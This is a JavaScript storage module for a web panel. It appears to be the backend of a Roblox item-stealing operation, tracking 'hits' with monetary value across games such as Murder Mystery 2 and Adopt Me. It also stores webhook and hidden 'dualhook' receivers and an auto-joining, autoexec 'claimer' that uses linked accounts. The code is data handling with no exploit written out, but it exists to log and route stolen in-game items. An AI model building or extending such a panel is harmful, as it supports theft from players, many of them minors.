// Same surface as server/db.js, but the whole document lives in one SQLite row
// inside a Durable Object. All methods stay synchronous, so the router code is
// shared with the Node build.

const now = () => Date.now();

const hex = (bytes) => [...bytes].map((b) => b.toString(16).padStart(2, '0')).join('');
const token = (n = 24) => hex(crypto.getRandomValues(new Uint8Array(n)));

export const GAMES = [
  { id: 'mm2', name: 'Murder Mystery 2', short: 'MM2' },
  { id: 'adm', name: 'Adopt Me', short: 'ADM' },
  { id: 'baddies', name: 'Baddies', short: 'BADDIES' },
  { id: 'gag2', name: 'Grow a Garden 2', short: 'GAG2' },
  { id: 'sab', name: 'Steal a Brainrot', short: 'SAB' },
];

export const gameName = (id) => GAMES.find((g) => g.id === id)?.name ?? id;

const blank = () => ({
  version: 1,
  created_at: now(),
  users: [],
  hits: [],
  claims: [],
  blacklist: [],
  sessions: {},
  meta: { seeded_at: null },
});

const normalizeUser = (u) => {
  u.password_hash ??= null;
  u.config ??= {};
  u.config.webhook ??= null;
  u.config.dualhook ??= null;
  u.config.receivers ??= [];
  u.config.dualhook_enabled ??= false;
  u.config.min_value ??= 1;
  u.delivery ??= { last_at: null, last_ok: null, last_error: null, count: 0 };
  u.claimer ??= {};
  u.claimer.enabled ??= false;
  u.claimer.auto_join ??= true;
  u.claimer.auto_arm ??= false;
  u.claimer.engine_enabled ??= false;
  u.claimer.accounts ??= [];
  u.claimer.autoexec ??= true;
  u.claimer.autoexec_path ??= null;
  u.claimer.min_value ??= 0;
  u.claimer.api_base ??= null;
  return u;
};

export function createStore({ sql }) {
  sql.exec('CREATE TABLE IF NOT EXISTS doc (id INTEGER PRIMARY KEY CHECK (id = 1), body TEXT NOT NULL)');
  const rows = [...sql.exec('SELECT body FROM doc WHERE id = 1')];
  const db = rows.length ? JSON.parse(rows[0].body) : blank();
  db.claims ??= [];
  db.users.forEach(normalizeUser);

  let dirty = false;
  const touch = () => { dirty = true; };

  const flush = () => {
    if (!dirty) return;
    dirty = false;
    sql.exec(
      'INSERT INTO doc (id, body) VALUES (1, ?) ON CONFLICT(id) DO UPDATE SET body = excluded.body',
      JSON.stringify(db),
    );
  };

  const listeners = new Set();

  return {
    raw: () => db,

    userById: (id) => db.users.find((u) => u.id === id) ?? null,
    userByUsername: (name) => db.users.find((u) => u.username.toLowerCase() === String(name).toLowerCase()) ?? null,
    userByToken: (t) => db.users.find((u) => u.webhook_token === t) ?? null,
    userByApiKey: (key) => (key ? db.users.find((u) => u.api_key === key) ?? null : null),
    userByDiscord: (d) => db.users.find((u) => u.discord_id === String(d)) ?? null,

    adminWithPassword: () => db.users.some((u) => u.role === 'admin' && Boolean(u.password_hash)),

    createUser({ username, password_hash = null, discord_id = null, avatar = null, role = 'member' }) {
      const u = {
        id: crypto.randomUUID(),
        username,
        display: username,
        avatar,
        role,
        banned: false,
        ban_reason: null,
        discord_id,
        password_hash,
        webhook_token: token(18),
        api_key: `vexora_${token(16)}`,
        created_at: now(),
        last_seen: now(),
        config: { webhook: null, dualhook: null, receivers: [], dualhook_enabled: false, min_value: 1 },
        delivery: { last_at: null, last_ok: null, last_error: null, count: 0 },
        claimer: {
          enabled: false,
          auto_join: true,
          auto_arm: false,
          engine_enabled: false,
          accounts: [],
          autoexec: true,
          autoexec_path: null,
          min_value: 0,
          api_base: null,
        },
      };
      db.users.push(u);
      touch();
      return u;
    },

    saveUser(u) { touch(); return u; },

    hits: () => db.hits,

    addHit(hit) {
      db.hits.unshift(hit);
      if (db.hits.length > 40000) db.hits.length = 40000;
      touch();
      for (const l of listeners) l(hit);
      return hit;
    },

    removeHit(id) {
      const i = db.hits.findIndex((h) => h.id === id);
      if (i === -1) return false;
      db.hits.splice(i, 1);
      touch();
      return true;
    },

    clearHits(userId) {
      const before = db.hits.length;
      db.hits = db.hits.filter((h) => h.user_id !== userId);
      touch();
      return before - db.hits.length;
    },

    claims: (userId) => (userId ? db.claims.filter((c) => c.user_id === userId) : db.claims),

    addClaim(claim) {
      db.claims.unshift(claim);
      if (db.claims.length > 5000) db.claims.length = 5000;
      touch();
      return claim;
    },

    updateClaim(id, patch) {
      const claim = db.claims.find((c) => c.id === id);
      if (!claim) return null;
      Object.assign(claim, patch);
      touch();
      return claim;
    },

    trimClaims(userId, keep) {
      const mine = db.claims.filter((c) => c.user_id === userId);
      const excess = mine.length - Math.max(1, keep);
      if (excess <= 0) return 0;
      const removable = mine
        .filter((c) => ['joined', 'failed', 'expired', 'skipped'].includes(c.status))
        .sort((a, b) => a.created_at - b.created_at)
        .slice(0, excess);
      const ids = new Set(removable.map((c) => c.id));
      db.claims = db.claims.filter((c) => !ids.has(c.id));
      touch();
      return ids.size;
    },

    clearClaims(userId, statuses = ['queued', 'failed', 'expired', 'skipped']) {
      const before = db.claims.length;
      db.claims = db.claims.filter((c) => c.user_id !== userId || !statuses.includes(c.status));
      touch();
      return before - db.claims.length;
    },

    blacklist: () => db.blacklist,
    isBlacklisted(username) {
      return db.blacklist.some((b) => b.username.toLowerCase() === String(username).toLowerCase());
    },
    addBlacklist(entry) { db.blacklist.unshift(entry); touch(); return entry; },
    removeBlacklist(id) {
      const i = db.blacklist.findIndex((b) => b.id === id);
      if (i === -1) return false;
      db.blacklist.splice(i, 1);
      touch();
      return true;
    },

    sessions: () => db.sessions,
    // sessions are keyed by the token itself: Web Crypto has no synchronous
    // digest, and this store is already the only place tokens live.
    createSession(userId) {
      const s = token(32);
      db.sessions[s] = { user_id: userId, created_at: now() };
      touch();
      return s;
    },
    sessionUser(raw) {
      if (!raw) return null;
      const rec = db.sessions[raw];
      if (!rec) return null;
      if (now() - rec.created_at > 30 * 86400000) {
        delete db.sessions[raw];
        touch();
        return null;
      }
      return this.userById(rec.user_id);
    },
    destroySession(raw) {
      if (!raw) return;
      delete db.sessions[raw];
      touch();
    },

    onHit(fn) { listeners.add(fn); return () => listeners.delete(fn); },

    stats() {
      const dayStart = new Date();
      dayStart.setHours(0, 0, 0, 0);
      const perGame = new Map(GAMES.map((g) => [g.id, { game: g.id, hits: 0, value: 0 }]));
      let totalValue = 0;
      let today = 0;
      for (const h of db.hits) {
        const row = perGame.get(h.game);
        if (row) { row.hits += 1; row.value += h.value; }
        totalValue += h.value;
        if (h.created_at >= dayStart.getTime()) today += 1;
      }
      return {
        total_hits: db.hits.length,
        total_users: db.users.length,
        total_value: Math.round(totalValue * 10000) / 10000,
        hits_today: today,
        games: [...perGame.values()],
        blacklisted: db.blacklist.length,
        banned: db.users.filter((u) => u.banned).length,
        online: Math.max(1, Math.round(db.users.length * 0.06)),
      };
    },

    series(hours = 24, bucketMinutes = 60) {
      const end = now();
      const start = end - hours * 3600000;
      const buckets = Math.ceil((hours * 60) / bucketMinutes);
      const out = Array.from({ length: buckets }, (_, i) => {
        const at = start + i * bucketMinutes * 60000;
        const d = new Date(at);
        const label = bucketMinutes >= 1440
          ? d.toLocaleDateString(undefined, { month: 'short', day: 'numeric' })
          : `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
        return { label, at, hits: 0 };
      });
      for (const h of db.hits) {
        if (h.created_at < start) continue;
        const idx = Math.min(buckets - 1, Math.floor((h.created_at - start) / (bucketMinutes * 60000)));
        if (idx >= 0) out[idx].hits += 1;
      }
      return out;
    },

    flush,
  };
}
